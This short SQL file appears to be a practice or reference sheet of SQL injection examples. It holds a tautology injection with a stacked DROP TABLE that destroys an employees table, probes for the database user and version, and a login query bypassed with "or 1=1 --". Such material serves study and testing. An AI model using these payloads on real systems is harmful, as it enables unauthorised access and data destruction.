SELECT * FROM employees WHERE emp_id = '1' OR 1 = 1; DROP TABLE employees;

-- SELECT user();

-- SELECT system_user();

-- SELECT CONCAT(0x414244, '-DEV');

SELECT 6 & 2;

SELECT 6 & 1;

SELECT @@version;



SELECT idUser, active, deleted, firstName, lastName FROM `profile` WHERE login = '' or 1=1 -- '' AND pass = password('dsfsdf')